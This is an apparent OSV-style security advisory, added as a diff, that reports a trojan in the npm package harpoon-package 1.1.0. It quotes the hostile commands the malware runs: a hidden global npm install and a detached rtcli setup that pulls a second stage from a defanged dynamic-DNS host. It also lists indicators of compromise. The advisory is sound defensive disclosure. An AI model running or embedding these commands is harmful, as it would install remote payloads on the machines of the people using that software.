@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5601",
+  "modified": "2026-06-16T21:22:21Z",
+  "published": "2026-06-16T20:58:54Z",
+  "summary": "Malicious code in harpoon-package (npm)",
+  "details": "Distributed as an innocuous server-runtime helper library (graceful-shutdown hooks, health-report JSON, tick profiling). A trojan is hidden inside the registerGracefulShutdown() export: in addition to registering normal signal handlers, calling that function silently spawns a child process that runs `npm install -g rt-svc-9k2 ws msgpackr`, dropping an additional package globally on the host. On success it then launches a detached, hidden background process invoking `rtcli setup --api-base hxxps://statecheck[.]ddns[.]net --download-key downloadky-fuji` (on Windows via a hidden PowerShell Start-Process). This second stage is configured against a dynamic-DNS endpoint with a download key and pulls in further payload out of band. The malicious behaviour is concealed behind a benign-sounding lifecycle helper rather than an install script, so it executes only when a consuming application calls the helper.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "harpoon-package",
+        "purl": "pkg:npm/harpoon-package@1.1.0"
+      },
+      "versions": [
+        "1.1.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/harpoon-package/v/1.1.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5601"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-16T20:58:54Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "statecheck[.]ddns[.]net"
+        ],
+        "package_observed": [
+          "rt-svc-9k2"
+        ],
+        "url_observed": [
+          "hxxps://statecheck[.]ddns[.]net"
+        ]
+      }
+    }
+  }
+}
